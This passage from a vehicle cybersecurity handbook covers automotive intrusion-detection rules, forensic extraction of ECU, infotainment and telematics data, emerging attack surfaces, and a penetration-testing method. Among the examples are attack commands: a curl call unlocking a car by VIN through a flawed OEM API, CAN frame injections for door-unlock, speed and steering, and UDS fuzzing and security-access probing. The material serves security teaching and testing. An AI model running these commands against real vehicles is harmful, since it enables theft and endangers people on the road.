        (bsm.certificate.epoch != scms.current_epoch AND
         bsm.certificate NOT IN scms.grace_period_list) OR
        (count(distinct bsm.certificate WHERE position_overlap(bsm.pos, 5m)) > 3
         within 10s) OR
        (bsm.tx_rate < 8 Hz OR bsm.tx_rate > 12 Hz sustained 5s)
action:
    - alert: "V2X misbehavior: {detection.trigger_detail}"
    - misbehavior_report: "Submit to SCMS Misbehavior Authority via §8.4 protocol"
    - local_response: "Demote sender trust score, exclude from path planning"
    - log_to: vehicle_siem
references:
    - §8 V2X security
    - §8.4 SCMS PKI
    - §8.5 Sybil attacks
```

**Rule 8: EV charging station MITM detection.**

```yaml
title: EVSE Communication MITM / Rogue Charging Station
id: veh-atk-008
status: stable
description: >
    Detects man-in-the-middle attacks on ISO 15118 PLC communication
    between the EV and EVSE: (1) TLS certificate chain validation
    failure during Plug & Charge handshake, (2) SLAC (Signal Level
    Attenuation Characterization) parameters inconsistent with direct
    physical connection (indicating PLC relay), (3) OCPP 1.6 cleartext
    commands observed when OCPP 2.0.1 (TLS-mandatory) was negotiated,
    (4) EVSE presenting an X.509 certificate not chaining to the
    V2G Root CA or Mobility Operator Sub-CA.
severity: high
data_sources:
    - iso15118_stack: tls_handshake_log, slac_parameters
    - ocpp_monitor: message_log, tls_status
    - pki_store: trusted_v2g_root_cas, mo_sub_cas
detection:
    condition: |
        (iso15118.tls_verify == FAIL) OR
        (iso15118.slac_attenuation > expected_direct_attenuation + 6 dB) OR
        (ocpp.negotiated_version == "2.0.1" AND ocpp.tls_active == false) OR
        (evse.certificate.issuer NOT IN trusted_v2g_ca_list)
action:
    - block: "Abort charging session, do not release payment credentials"
    - alert: "Rogue EVSE / MITM detected: {detection.trigger_detail}"
    - log_to: vehicle_siem + charging_network_operator
    - response: "Capture PLC trace, preserve TLS handshake for forensic analysis"
references:
    - §9 EV charging infrastructure
    - §9.3 ISO 15118 PLC attacks
    - §9.4 Rogue EVSE
```

### 10.2 Automotive IDS architecture

Commercial automotive intrusion detection systems operate at three tiers. The in-vehicle IDS agent runs on the gateway ECU or a dedicated security ECU, performing real-time analysis of CAN/Ethernet traffic. It implements the detection rules above plus CAN-layer rules from Chapter 21A §11D. The telematic uplink transmits compressed security events (not raw bus traffic — bandwidth constraints on cellular) to the OEM Vehicle Security Operations Center (VSOC). The cloud-based analytics platform correlates events across the fleet, enabling detection of coordinated attacks that target multiple vehicles simultaneously.

**Argus Cyber Security** (acquired by Continental, 2017) provides an in-vehicle IDS that monitors CAN, CAN-FD, and Automotive Ethernet. The Argus system uses deterministic rule matching combined with an ML anomaly detector trained on each vehicle model's baseline traffic. It integrates with the gateway ECU as a software module or runs on a dedicated security processor. Detection latency target: < 5 ms per frame on CAN, < 10 ms per Ethernet packet.

**Upstream Security** operates the cloud VSOC model. Their platform ingests telemetry from connected vehicles (TCU data, diagnostic logs, OTA events) and applies fleet-wide behavioral analytics. Upstream's approach detects anomalies that are invisible at the single-vehicle level — for example, a firmware update that causes 0.1% of a model population to exhibit unusual CAN traffic patterns (indicating a supply-chain-compromised update). They reported in their 2024 Global Automotive Cybersecurity Report that API-based attacks on connected car services increased 380% between 2022 and 2023.

**C2A Security** (now part of Aptiv) provides a DevSecOps platform for automotive software, including an in-vehicle runtime security agent that monitors ECU execution integrity (control flow integrity checks, memory protection, secure boot chain verification) in addition to network-level IDS.

Integration architecture for a typical deployment:

```
┌─────────────────────────────────────────────────────────┐
│                    VEHICLE                               │
│                                                         │
│  ┌──────────┐   ┌──────────┐   ┌──────────┐            │
│  │ CAN IDS  │   │ ETH IDS  │   │ ECU RTM  │            │
│  │ (21A     │   │ (SOME/IP │   │ (runtime │            │
│  │  rules)  │   │  DPI)    │   │  monitor)│            │
│  └────┬─────┘   └────┬─────┘   └────┬─────┘            │
│       └───────────────┼──────────────┘                  │
│                  ┌────▼─────┐                            │
│                  │ Security │ ◄── Rules from §10.1      │
│                  │   ECU    │     + Chapter 21A §11D    │
│                  └────┬─────┘                            │
│                       │ Compressed events                │
│                  ┌────▼─────┐                            │
│                  │   TCU    │ Cellular uplink            │
│                  └────┬─────┘                            │
└───────────────────────┼─────────────────────────────────┘
                        │ TLS 1.3 / MQTT
                   ┌────▼──────────────────────────┐
                   │         OEM VSOC               │
                   │  ┌────────────┐ ┌───────────┐ │
                   │  │ Event      │ │ Fleet     │ │
                   │  │ Correlator │ │ Analytics │ │
                   │  └─────┬──────┘ └─────┬─────┘ │
                   │        └───────┬──────┘       │
                   │           ┌────▼─────┐        │
                   │           │ Incident │        │
                   │           │ Response │        │
                   │           └──────────┘        │
                   └───────────────────────────────┘
```

### 10.3 Fleet-level monitoring and telemetry analysis

A VSOC processing connected-vehicle telemetry at fleet scale (100K+ vehicles) must handle millions of security events per hour. Key fleet-level detection patterns:

**Anomalous firmware version distribution.** After an OTA campaign, 99.8% of targeted vehicles report the new firmware version. The 0.2% that report the old version or an unknown version may have rejected a tampered update (detection) or may have been selectively excluded by an attacker controlling the Director repository (§6.3). The VSOC correlates firmware version telemetry with OTA server logs to identify discrepancies.

**Geospatial clustering of security events.** Relay attacks on key fobs (§3) tend to cluster in specific geographic areas (parking structures, residential streets). The VSOC plots security events geospatially and flags clusters that exceed baseline density. A spike in relay-attack indicators at a specific shopping center parking lot enables the fleet operator to issue driver notifications and collaborate with law enforcement.

**API abuse detection.** Connected car APIs (manufacturer mobile apps, third-party integrations) are a growing attack surface. Upstream reported that in 2023, 12% of automotive cyber incidents targeted backend APIs. The VSOC monitors API call patterns for: credential stuffing (high failure rate from distributed IPs), enumeration (sequential VIN queries), privilege escalation (user accessing vehicles not in their account), and data exfiltration (bulk telematics download).

---

## 11. Vehicle Forensics Enhancement

> **Scope boundary.** For CAN bus traffic capture tooling and raw frame analysis, see Chapter 21A §11A (CAN exploitation tools) and §3 (CAN message reverse engineering). This section covers incident-investigation forensics at the vehicle-attack level: ECU memory, infotainment artifacts, telematics recovery, EDR extraction, and chain of custody.

### 11.1 ECU memory extraction for incident investigation

When an ECU is suspected of compromise (firmware modification, unauthorized calibration change, or participation in a CAN injection attack), forensic extraction of its flash memory provides definitive evidence. The extraction must be performed without altering the ECU state — a requirement that parallels volatile memory acquisition in traditional DFIR.

**Non-invasive extraction via UDS.** If the ECU supports ReadMemoryByAddress (UDS SID 0x23), the investigator can dump flash contents over the diagnostic bus. This requires an active diagnostic session (typically ExtendedDiagnostic 0x10 0x03) and successful SecurityAccess authentication (SID 0x27). The extracted image is hashed (SHA-256) immediately and logged with timestamp (ISO 8601) for chain of custody:

```bash
# Using python-can + udsoncan to extract ECU memory forensically
# Prerequisite: authorized diagnostic access (SecurityAccess completed)

python3 - <<'PYEOF'
import udsoncan
from udsoncan.connections import PythonIsoTpConnection
from udsoncan.client import Client
from udsoncan.configs import default_client_config
import can
import hashlib
import datetime
import json

bus = can.interface.Bus(channel='can0', bustype='socketcan')
conn = PythonIsoTpConnection(bus, rxid=0x7E8, txid=0x7E0)
config = dict(default_client_config)
config['data_identifiers'] = {}

with Client(conn, config=config) as client:
    client.change_session(udsoncan.services.DiagnosticSessionControl.Session.extendedDiagnosticSession)
    # SecurityAccess omitted — investigator must have authorized key
    
    # Define memory regions to extract
    regions = [
        {'name': 'bootloader',   'address': 0x00000000, 'length': 0x00010000},
        {'name': 'application',  'address': 0x00010000, 'length': 0x00100000},
        {'name': 'calibration',  'address': 0x00110000, 'length': 0x00020000},
        {'name': 'dtc_storage',  'address': 0x00130000, 'length': 0x00008000},
    ]
    
    evidence = {
        'extraction_timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
        'tool': 'udsoncan forensic extractor',
        'ecu_rx_id': '0x7E8',
        'regions': []
    }
    
    for region in regions:
        data = b''
        offset = region['address']
        remaining = region['length']
        chunk_size = 0x0FFA  # Max UDS payload per read
        
        while remaining > 0:
            read_len = min(chunk_size, remaining)
            resp = client.read_memory_by_address(offset, read_len)
            data += resp.service_data.memory_block
            offset += read_len
            remaining -= read_len
        
        sha256 = hashlib.sha256(data).hexdigest()
        filename = f"ecu_dump_{region['name']}_{evidence['extraction_timestamp'][:10]}.bin"
        with open(filename, 'wb') as f:
            f.write(data)
        
        evidence['regions'].append({
            'name': region['name'],
            'address': hex(region['address']),
            'length': hex(region['length']),
            'sha256': sha256,
            'filename': filename
        })
    
    with open('extraction_manifest.json', 'w') as f:
        json.dump(evidence, f, indent=2)

print("Extraction complete. Verify manifest: extraction_manifest.json")
PYEOF
```

**Invasive extraction via JTAG/SWD.** When the ECU is unresponsive, locked out of diagnostic access, or when non-invasive extraction might alter state (e.g., DTC memory cleared on session open), hardware-level extraction using JTAG (Chapter 17 §3.3) or direct flash chip reading (desoldering + SPI/parallel reader) is required. This preserves the exact memory state at the time of seizure. Document the physical state of the ECU (photos, connector pin states, tamper indicators) before any probe attachment.

### 11.2 CAN bus traffic forensic reconstruction

Post-incident CAN traffic reconstruction relies on three data sources: (1) the gateway ECU's internal log buffer (Security Event Memory, SecM, per AUTOSAR), which stores the last N security-relevant events with timestamps; (2) aftermarket telematics devices or dashcams that log CAN traffic (e.g., comma.ai Panda logs all bus traffic with microsecond timestamps); (3) the vehicle's Event Data Recorder (EDR), which captures a pre-crash window of critical signals.

Reconstruction procedure:

```bash
# Parse a CAN log (standard candump or ASC format) for forensic timeline
# Correlate with known attack patterns

# Step 1: Convert raw candump log to structured CSV
candump -L can0 > incident_capture.log

# Step 2: Parse with can-utils asc2log or custom parser
python3 -c "
import csv, sys
with open('incident_capture.log') as f, open('parsed_timeline.csv','w',newline='') as out:
    writer = csv.writer(out)
    writer.writerow(['timestamp','interface','id','dlc','data','annotation'])
    for line in f:
        parts = line.strip().split()
        if len(parts) >= 4:
            ts = parts[0].strip('()')
            iface = parts[1]
            id_dlc = parts[2].split('#')
            can_id = id_dlc[0]
            data = id_dlc[1] if len(id_dlc)>1 else ''
            # Annotate known attack indicators
            annotation = ''
            if can_id.upper() in ['7DF','7E0','7E1','7E2','7E3','7E4','7E5','7E6','7E7']:
                annotation = 'DIAGNOSTIC_REQUEST'
            if data[:2] == '27':
                annotation = 'SECURITY_ACCESS_REQUEST'
            if data[:2] == '10':
                annotation = 'SESSION_CONTROL'
            writer.writerow([ts, iface, can_id, len(data)//2, data, annotation])
print('Timeline written to parsed_timeline.csv')
"

# Step 3: Statistical analysis — detect injection by IAT anomaly
python3 -c "
import csv
from collections import defaultdict
import statistics

timestamps = defaultdict(list)
with open('parsed_timeline.csv') as f:
    reader = csv.DictReader(f)
    for row in reader:
        timestamps[row['id']].append(float(row['timestamp']))

print('ID       | Count  | Mean IAT (ms) | StdDev (ms) | Anomaly')
print('-' * 65)
for can_id, ts_list in sorted(timestamps.items()):
    if len(ts_list) < 10:
        continue
    iats = [(ts_list[i]-ts_list[i-1])*1000 for i in range(1, len(ts_list))]
    mean = statistics.mean(iats)
    stdev = statistics.stdev(iats) if len(iats) > 1 else 0
    anomaly = 'YES' if stdev > mean * 0.5 else 'no'
    print(f'{can_id:8s} | {len(ts_list):6d} | {mean:13.2f} | {stdev:11.2f} | {anomaly}')
"
```

### 11.3 Infotainment system forensics

IVI systems run general-purpose operating systems (QNX, Android Automotive OS, embedded Linux) that store rich forensic artifacts analogous to mobile device forensics.

**Key artifact locations (Linux-based IVI):**

| Artifact | Typical path | Forensic value |
|----------|-------------|----------------|
| Navigation history | `/data/navigation/history.db` (SQLite) | GPS coordinates, timestamps, search queries |
| Bluetooth pairing database | `/var/lib/bluetooth/<adapter>/` | Paired device MACs, names, link keys |
| Call logs (HFP) | `/data/bluetooth/hfp_call_log.db` | Phone numbers, call duration, timestamps |
| Contacts (PBAP sync) | `/data/bluetooth/contacts/` (vCard) | Synced phonebook from paired phones |
| Wi-Fi connection history | `/etc/wpa_supplicant/wpa_supplicant.conf` or `/data/misc/wifi/` | SSIDs, PSKs, last-connected timestamps |
| USB device history | `/var/log/syslog`, `dmesg` ring buffer | USB VID/PID, mount times, filenames accessed |
| Browser history/cache | `/data/browser/` or `/home/user/.cache/chromium/` | URLs, cookies, cached pages, form data |
| App installation logs | `/var/log/app_install.log`, package manager DB | Installed apps, versions, installation sources |
| System logs | `/var/log/`, journald | Boot times, crash logs, network events, process execution |
| SSH/shell access logs | `/var/log/auth.log`, `/root/.bash_history` | Unauthorized access evidence |

**Android Automotive OS forensics.** The IVI partition layout follows Android conventions but with automotive-specific partitions. The `/data/system/vehicle/` directory contains vehicle-specific databases (VehiclePropertyStore.db). Use `adb` (if debug bridge is enabled) or direct eMMC chip-off extraction:

```bash
# If ADB is accessible (debug build or after exploit)
adb root
adb pull /data/system/vehicle/ ./vehicle_data/
adb pull /data/data/com.android.car.settings/databases/ ./car_settings/
adb pull /data/system/bluetooth/ ./bluetooth_artifacts/
adb pull /data/system/users/0/ ./user_profile/

# Hash all extracted artifacts
find ./vehicle_data ./car_settings ./bluetooth_artifacts ./user_profile \
    -type f -exec sha256sum {} \; > extraction_hashes.txt
```

### 11.4 Telematics data recovery

The Telematics Control Unit (TCU) stores and transmits driving telemetry to the OEM backend. This data is critical for incident reconstruction:

**Event Data Recorder (EDR).** NHTSA 49 CFR Part 563 mandates EDR data elements for vehicles sold in the United States since 2014-09-01. The EDR captures a 5-second pre-crash and 250 ms post-crash window including: vehicle speed, engine RPM, brake application, throttle position, steering angle, seatbelt status, airbag deployment timing, delta-V (crash severity), and stability control activation. EDR data is extracted via the OBD-II port using the Bosch CDR (Crash Data Retrieval) tool or equivalent:

```
# EDR extraction workflow (conceptual — actual tool is commercial GUI)
# Bosch CDR 900 system
# 1. Connect CDR 900 DLC cable to vehicle OBD-II port
# 2. Power on CDR tool, select vehicle make/model/year
# 3. Tool reads EDR via proprietary UDS commands (OEM-specific SIDs)
# 4. CDR software generates report including:
#    - Pre-crash data (5s): speed, RPM, brake, throttle, steering
#    - Crash pulse: delta-V profile (ms resolution)
#    - Post-crash: airbag deployment, belt pretensioner, fuel cutoff
#    - System status: DTC codes, ABS/ESC status, ADAS active
# 5. Export as PDF report + raw binary for independent analysis
# 6. SHA-256 hash of raw binary → chain of custody log
```

**GPS/telematics log recovery.** TCU flash storage contains GPS breadcrumb trails (latitude, longitude, speed, heading, timestamp) typically stored in a circular buffer. Commercial fleet telematics systems (Geotab, CalAmp, Sierra Wireless) store this data both locally and in the cloud. For incident investigation:

```bash
# Extract GPS logs from a Linux-based TCU (if shell access obtained)
# Typical location varies by OEM — common patterns:

# Qualcomm MDM-based TCU
dd if=/dev/mmcblk0p8 of=tcu_userdata.img bs=4096
mount -o ro,loop tcu_userdata.img /mnt/tcu
find /mnt/tcu -name "*.gps" -o -name "*.nmea" -o -name "gps_log*" \
    -exec sha256sum {} \; | tee gps_extraction_hashes.txt
cp /mnt/tcu/gps_data/* ./evidence/gps/

# Parse NMEA sentences to KML for visualization
python3 -c "
import re
kml_header = '''<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<kml xmlns=\"http://www.opengis.net/kml/2.2\"><Document>
<name>TCU GPS Track</name><Placemark><LineString><coordinates>'''
kml_footer = '''</coordinates></LineString></Placemark></Document></kml>'''
coords = []
with open('./evidence/gps/gps_log.nmea') as f:
    for line in f:
        if line.startswith('\$GPRMC') or line.startswith('\$GNRMC'):
            parts = line.split(',')
            if parts[2] == 'A':  # Valid fix
                lat = float(parts[3][:2]) + float(parts[3][2:])/60
                if parts[4] == 'S': lat = -lat
                lon = float(parts[5][:3]) + float(parts[5][3:])/60
                if parts[6] == 'W': lon = -lon
                coords.append(f'{lon},{lat},0')
with open('track.kml','w') as f:
    f.write(kml_header + ' '.join(coords) + kml_footer)
print(f'Wrote {len(coords)} points to track.kml')
"
```

### 11.5 EV charging session forensic analysis

Charging sessions leave forensic artifacts on both the vehicle and EVSE sides:

**Vehicle-side artifacts.** The Battery Management System (BMS) logs charging sessions with timestamps, energy delivered (kWh), peak charging rate (kW), State of Charge (SoC) start/end, charging station identifier (EVSE ID from ISO 15118 or OCPP), and any error codes. On Tesla vehicles, the MCU stores detailed charging history in SQLite databases accessible via CID root access. On other EVs, the OEM backend API provides charging history (accessible to the owner via the mobile app, and to investigators via legal request to the OEM).

**EVSE-side artifacts.** The EVSE's OCPP transaction logs contain: transaction start/stop timestamps, meter values (energy, current, voltage at configurable intervals), connector ID, RFID/NFC tag ID used for authentication, ISO 15118 contract certificate identifier (if Plug & Charge), and any error/fault codes. OCPP 2.0.1 additionally logs security events (AuthorizationStatusInfo, TamperDetection). These logs reside on the EVSE controller (often an embedded Linux SBC) and are replicated to the Charging Station Management System (CSMS) backend.

### 11.6 Chain of custody for automotive digital evidence

Automotive digital evidence requires the same rigor as any DFIR engagement, with additional considerations for the vehicle environment:

1. **Scene documentation.** Photograph the vehicle exterior, interior, OBD-II port area, and any visible modifications (aftermarket dongles, spliced wires, added ECUs). Record VIN, odometer reading, and ignition state. Timestamp all photos (UTC ISO 8601).

2. **Evidence isolation.** Disconnect the vehicle's cellular antenna (TCU) to prevent remote wipe or OTA update that could alter evidence. If disconnection is not possible (sealed TCU), document the risk in the evidence log.

3. **Live acquisition.** Before powering off, capture volatile data: active diagnostic sessions, CAN bus traffic (30-second capture minimum), IVI running processes, network connections, memory state of security-relevant ECUs.

4. **Imaging.** Create bit-for-bit images of all storage media: IVI eMMC/SSD, TCU flash, gateway ECU flash, relevant domain ECU flash. Hash each image (SHA-256) immediately after creation. Use write-blockers where possible; document tool chain and version.

5. **Transport.** Secure the vehicle to prevent unauthorized access during transport to the forensic facility. If ECUs are removed, bag and tag individually with tamper-evident seals. Chain of custody forms: date, time, handler name, purpose of transfer.

6. **Analysis environment.** Work on forensic copies, never originals. Maintain an analysis log with timestamps for every action taken on the evidence. Cross-reference findings with the detection events from §10 and CAN anomaly detections from Chapter 21A §11D.

---

## 12. Emerging Vehicle Attack Surfaces

### 12.1 Software-Defined Vehicle (SDV) architecture

The industry transition toward Software-Defined Vehicles fundamentally expands the attack surface. In the SDV model, vehicle functionality is implemented in software running on high-performance compute platforms (HPCs) rather than distributed across dozens of specialized ECUs. The HPC (e.g., NVIDIA DRIVE Orin, Qualcomm Snapdragon Ride, Mobileye EyeQ Ultra) runs a hypervisor hosting multiple guest VMs: one for ADAS/AD, one for infotainment, one for vehicle dynamics, and one for connectivity. This consolidation means a hypervisor escape vulnerability grants access to all vehicle domains simultaneously — a single-point-of-failure architecture that did not exist when each domain ran on isolated hardware.

The SDV's software update cadence accelerates from annual (traditional model-year updates) to monthly or even over-the-air feature releases. Each update cycle introduces new code and new potential vulnerabilities. The SDV also introduces an app ecosystem: third-party applications running in sandboxed containers on the HPC. These apps interact with vehicle APIs that expose functions ranging from reading telemetry (benign) to controlling HVAC and lighting (moderate) to interfacing with ADAS parameters (critical). API boundary enforcement becomes the new gateway firewall:

```
# SDV API permission model — conceptual vehicle.api manifest
# Each third-party app declares required permissions

app_manifest:
  name: "SmartParkingAssist"
  vendor: "ParkTech Inc."
  permissions:
    - vehicle.telemetry.speed: READ           # Granted automatically
    - vehicle.telemetry.gps: READ             # Granted automatically
    - vehicle.body.lights.hazard: WRITE        # Requires user consent
    - vehicle.adas.parking_assist: INVOKE      # Requires OEM code review + signing
    - vehicle.chassis.steering: WRITE          # DENIED — safety-critical, no third-party access
    - vehicle.network.can_raw: READ            # DENIED — no raw bus access for apps
  sandbox:
    network: restricted  # App can reach its own backend only (allowlisted domains)
    filesystem: isolated # App sees only its own data directory
    ipc: vehicle_api_only # No direct IPC to other VMs or native processes
```

A compromised third-party app running in a weak sandbox could escalate through the vehicle API, similar to how a compromised Android app escalates through the Android permission model. The difference: vehicle API escalation can have physical safety consequences.

### 12.2 Vehicle-to-Grid (V2G) bidirectional charging attacks

V2G enables EVs to discharge stored energy back to the grid, creating a bidirectional power flow. This opens attack vectors beyond the unidirectional charging attacks in §9:

**Grid destabilization via coordinated V2G manipulation.** An attacker who compromises a V2G aggregator (the entity that schedules charge/discharge across a fleet of EVs) can coordinate simultaneous discharge from thousands of vehicles, creating a sudden power injection that destabilizes grid frequency. Conversely, they can schedule simultaneous high-rate charging, creating a demand spike. The IEEE 2030.5 (Smart Energy Profile 2.0) protocol governs V2G communication between the EV, EVSE, and the utility/aggregator. CVE-2023-34432 demonstrated an authentication bypass in a V2G aggregator platform's API, enabling unauthorized scheduling of charge/discharge events.

**Financial fraud via metering manipulation.** V2G involves bidirectional energy metering — the EV earns credits for energy returned to the grid. Manipulation of the ISO 15118-20 bidirectional metering messages (MeteringReceiptReq/Res) could inflate discharge amounts, generating fraudulent grid credits. The integrity of these messages depends on the TLS session between the EV's communication controller and the EVSE, plus the OCPP 2.0.1 MeterValues reported to the CSMS. An attacker who compromises the EVSE's metering firmware (PLC-level MITM similar to §9.3) can forge discharge amounts.

### 12.3 Autonomous vehicle AI/ML attacks

Autonomous vehicles (SAE Level 3+) rely on perception models (object detection, semantic segmentation, depth estimation) that are vulnerable to adversarial attacks extending beyond the ADAS sensor spoofing in §7:

**Adversarial patches on road infrastructure.** Research by Eykholt et al. (CVPR 2018) demonstrated that small sticker patches applied to stop signs caused misclassification by YOLO and Faster R-CNN models. The attack transfers to production ADAS systems: a patch causing a stop sign to be classified as a speed limit sign could cause the autonomous vehicle to proceed through an intersection. Unlike LiDAR spoofing (§7.1), adversarial patch attacks require no electronic equipment — only physical access to road infrastructure.

**Semantic adversarial examples targeting planning.** Beyond perception-level attacks, recent research (Cao et al., NDSS 2024) demonstrates attacks on the planning pipeline: injecting phantom objects that the perception system correctly identifies but that trigger dangerous planning decisions. For example, a phantom pedestrian detected on the highway median causes emergency braking in high-speed traffic. The attack exploits the gap between perception (correctly detecting an object) and planning (incorrectly reacting to it in context).

**Model extraction via vehicle APIs.** SDV architectures (§12.1) that expose perception pipeline telemetry (detected objects, confidence scores, bounding boxes) through diagnostic or developer APIs enable model extraction attacks. An attacker queries the API with crafted camera inputs and observes the model's outputs, reconstructing a surrogate model that can be used to generate targeted adversarial examples offline. CVE-2024-20017 (MediaTek Wi-Fi chipset RCE, CVSS 9.8, CWE-787) is relevant here: compromising the IVI's Wi-Fi stack provides a path to the HPC network where ADAS telemetry flows.

### 12.4 In-vehicle payment systems

Modern vehicles integrate NFC-based payment for fuel, tolls, parking, and EV charging. The payment flow typically involves: (1) an NFC secure element in the vehicle (embedded in the IVI or a dedicated payment ECU), (2) communication with the payment terminal via ISO 14443/NFC, (3) tokenized card credentials stored in a Trusted Execution Environment (TEE) on the HPC or a dedicated Hardware Security Module (HSM).

Attack vectors include: relay attacks on the NFC interface (extending the vehicle's NFC range to a remote payment terminal — analogous to key fob relay in §3.3), side-channel attacks on the TEE to extract payment tokens (requires physical access to the HPC, similar to Chapter 17 fault injection), and man-in-the-middle on the payment authorization flow between the vehicle and the payment backend (if TLS certificate pinning is not properly implemented).

### 12.5 Fleet management system attacks

Fleet management platforms (Geotab, Samsara, CalAmp, Fleetio) provide centralized control over vehicle fleets: remote diagnostics, geofencing, driver behavior monitoring, and increasingly, remote vehicle commands (lock/unlock, engine disable, speed limiting). A compromised fleet management account or API vulnerability grants an attacker control over the entire fleet:

**Remote command injection.** Fleet management systems that support remote engine immobilization (used for stolen vehicle recovery or driver compliance) can be abused to disable vehicles in motion. In 2019, a security researcher (L&M) demonstrated unauthorized access to iTrack and ProTrack GPS tracking platforms, gaining remote engine-kill capability over 27,000+ vehicles. The root cause: default passwords ("123456") on fleet management accounts and API endpoints that accepted commands without verifying caller authorization beyond a session token.

**Geofencing bypass.** Fleet vehicles are often restricted to authorized geographic zones via geofencing. An attacker who compromises the telematics device can spoof GPS coordinates (feeding the fleet management platform false location data) or disable the geofencing enforcement locally on the TCU. This enables unauthorized vehicle use, smuggling operations, or evasion of regulatory compliance zones (e.g., low-emission zones).

**Data exfiltration.** Fleet telemetry databases contain sensitive information: vehicle locations (real-time and historical), driver identities, routes, cargo manifests, and customer delivery addresses. A breach of the fleet management backend exposes this data at scale. Samsara disclosed a security incident in 2023 involving unauthorized access to customer fleet data via a compromised internal tool.

### 12.6 Connected car API security

OEMs expose APIs for mobile apps, third-party integrations, and dealer systems. These APIs have become a primary attack vector:

**Tesla API.** The unofficial Tesla API (owner-api.teslamotors.com, migrated to Fleet API in 2024) exposed endpoints for vehicle location, lock/unlock, climate control, and summon. Researchers demonstrated that compromised OAuth tokens (stolen via phishing or MITM on third-party apps like TezLab, Stats) granted full vehicle control. Tesla's migration to Fleet API with improved OAuth scoping and partner API restrictions (2024) addressed some issues, but third-party apps still request broad scopes.

**Mercedes me connect / BMW ConnectedDrive / Kia Connect API vulnerabilities.** Sam Curry et al. (2022-2023) disclosed a series of API vulnerabilities across multiple OEMs: Kia vehicles were vulnerable to remote unlock, start, and location tracking using only the VIN (no authentication required — the API endpoint accepted raw VIN as an identifier without verifying ownership). Mercedes me connect had SSRF vulnerabilities in internal APIs. BMW's ConnectedDrive had improper session handling enabling account takeover. Hyundai/Genesis APIs accepted sequential user IDs enabling enumeration and unauthorized vehicle access.

```
# Demonstrating API enumeration risk (ethical testing against test account only)
# Pattern observed in 2022 Kia Connect API vulnerability (Curry et al.)

# Step 1: Attacker obtains target VIN (visible through windshield)
TARGET_VIN="KNAE35LC0N5012345"

# Step 2: API call that should require owner authentication but didn't
curl -s -X POST "https://api.example-oem.com/v1/vehicles/${TARGET_VIN}/commands/unlock" \
    -H "Authorization: Bearer <any_valid_session_token>" \
    -H "Content-Type: application/json" \
    -d '{"command": "UNLOCK_ALL_DOORS"}' \
    | jq .

# Expected (secure): 403 Forbidden — token does not match vehicle owner
# Actual (vulnerable): 200 OK — vehicle unlocked

# Impact: Any authenticated user could control any vehicle by VIN
# Root cause: CWE-639 (Authorization Bypass Through User-Controlled Key)
# The API used VIN as the resource identifier but did not verify the
# requesting user was the registered owner of that VIN.
```

---

## 13. Vehicle Security Testing Methodology

### 13.1 Pre-engagement: vehicle-specific safety constraints

Vehicle security testing introduces unique safety considerations absent from traditional penetration testing. The test plan must address:

**Physical safety.** Tests that inject CAN messages on chassis or powertrain buses can cause unintended steering, braking, or acceleration. All CAN injection testing must be performed on a stationary vehicle with wheels off the ground (on a lift or jackstands) and the parking brake engaged. If testing must occur in motion (e.g., validating ADAS behavior under spoofing), it must be on a closed course with a safety driver who can override via manual controls. Document these constraints in the Rules of Engagement (RoE).

**Regulatory compliance.** UNECE WP.29 Regulation 155 (UN R155) mandates a Cyber Security Management System (CSMS) for vehicle type approval in the EU, Japan, and South Korea since 2022-07. UN R156 mandates software update management (SUMS). Testing methodology should map findings to R155 Annex 5 threat categories. In the US, NHTSA's Cybersecurity Best Practices for the Safety of Modern Vehicles (2022 update) provides non-binding guidance. ISO/SAE 21434 (Road vehicles — Cybersecurity engineering) defines the TARA (Threat Analysis and Risk Assessment) process that structures vehicle security testing.

**Test environment setup.** Isolate the vehicle under test from production networks. The TCU's cellular connection must be disabled or rerouted through a test network to prevent accidental interaction with production OTA servers or fleet management systems. If testing Plug & Charge (ISO 15118), use a test PKI with test certificates — never interact with the production V2G PKI.

```bash
# Test environment network isolation setup

# 1. Disable TCU cellular (if physically accessible)
# Remove SIM card or disconnect antenna cable. Document with photos.

# 2. Create isolated CAN test network
# Use a separate CAN interface for injection testing — never inject
# on the vehicle's live bus unless specifically testing gateway filtering.
sudo ip link set can0 type can bitrate 500000
sudo ip link set can0 up

# 3. Set up EVSE test environment (for charging security testing)
# Use an isolated EVSE with test OCPP backend
docker run -d --name ocpp-test-backend \
    -p 8080:8080 \
    -e "OCPP_VERSION=2.0.1" \
    -e "TLS_ENABLED=true" \
    -e "TLS_CERT=/certs/test-csms.pem" \
    -v ./test-certs:/certs \
    ghcr.io/mobilityhouse/ocpp-test-server:latest

# 4. Set up V2X test transmitter (for BSM testing)
# Use COHDA MK6 or Commsignia RSU in test mode
# Configure test SCMS certificates (never production)
```

### 13.2 CAN bus security assessment

CAN bus testing at the vehicle-attack level focuses on the impact of injected messages rather than protocol-level analysis (covered in Chapter 21A §4):

**Phase 1: Reconnaissance.** Identify all CAN buses accessible from each physical access point (OBD-II port, aftermarket connectors, headlamp wiring, side mirror wiring). Map which arbitration IDs are present on each bus and which ECUs originate them. Use `cansniffer` and `candump` with the vehicle in various states (ignition off, ACC, running, driving on dynamometer).

**Phase 2: Gateway filter testing.** From the OBD-II port (diagnostic bus), attempt to transmit messages with arbitration IDs belonging to other domains (powertrain, chassis, body, ADAS). Document which IDs are forwarded by the gateway and which are blocked. This maps the gateway's actual routing table versus its intended whitelist.

**Phase 3: Safety-critical message injection.** With the vehicle secured on a lift, inject messages for safety-critical functions and observe the response:

```bash
# CAN injection test cases — VEHICLE MUST BE STATIONARY AND SECURED
# These tests validate gateway isolation and ECU authentication

# Test: Inject door unlock command on body bus
# Expected (secure): Gateway blocks from diagnostic port, or body ECU
# requires authenticated session
cansend can0 750#0400000000000000

# Test: Inject instrument cluster speed display
# Expected (secure): Cluster validates source or uses SecOC MAC
cansend can0 0B6#0000006400000000  # 100 km/h

# Test: Inject steering angle sensor reading
# Expected (secure): EPS ECU rejects non-SecOC-authenticated frames
cansend can0 025#00000000FF000000

# Automated fuzzing with caringcaribou
# Fuzz UDS services on target ECU (0x7E0)
caringcaribou uds discovery -min 0x7e0 -max 0x7e0

# Fuzz ECU for undocumented UDS services
caringcaribou uds services 0x7e0 0x7e8

# Test SecurityAccess with known weak algorithms
caringcaribou uds security_seed 0x7e0 0x7e8 --level 1
```

**Phase 4: Fuzzing.** Use `caringcaribou` and custom fuzzers to test ECU robustness against malformed CAN frames. Focus on: oversized DLC values, rapid arbitration ID cycling, CAN-FD frames sent to non-FD ECUs, and UDS multiframe (ISO-TP) fragmentation attacks.

### 13.3 Key fob security assessment

